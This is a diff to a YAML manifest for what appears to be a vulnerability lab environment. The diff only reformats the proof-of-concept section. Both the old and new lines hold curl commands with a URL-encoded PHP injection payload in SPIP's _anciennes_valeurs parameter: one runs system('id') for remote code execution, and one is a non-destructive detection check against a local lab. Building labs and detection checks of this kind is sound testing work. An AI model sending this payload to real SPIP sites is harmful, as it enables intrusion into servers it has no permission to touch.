@@ -112,17 +112,12 @@ poc:
   nuclei:
     - "vt-2025-71243.nuclei.yaml"
   manual:
-    steps:
-      - "Start lab: docker-compose up -d"
-      - "Wait for initialization (~60s)"
-      - "Send exploit payload to the form page"
+    - "Start lab: docker-compose up -d"
+    - "Wait for initialization (~60s)"
+    - "Send exploit payload to the form page"
   curl_examples:
-    - name: "RCE via _anciennes_valeurs injection"
-      command: |
-        curl -s "http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%3Cinput%20value%3D%27x"
-    - name: "Detection check (non-destructive)"
-      command: |
-        curl -s "http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20echo%20%27VT_RCE_CHECK%27%3B%20%3F%3E%3Cinput%20value%3D%27x" | grep -o "VT_RCE_CHECK"
+    - "RCE via _anciennes_valeurs injection: curl -s \"http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%3Cinput%20value%3D%27x\""
+    - "Detection check (non-destructive): curl -s \"http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20echo%20%27VT_RCE_CHECK%27%3B%20%3F%3E%3Cinput%20value%3D%27x\" | grep -o \"VT_RCE_CHECK\""
 
 providers:
   docker-compose:
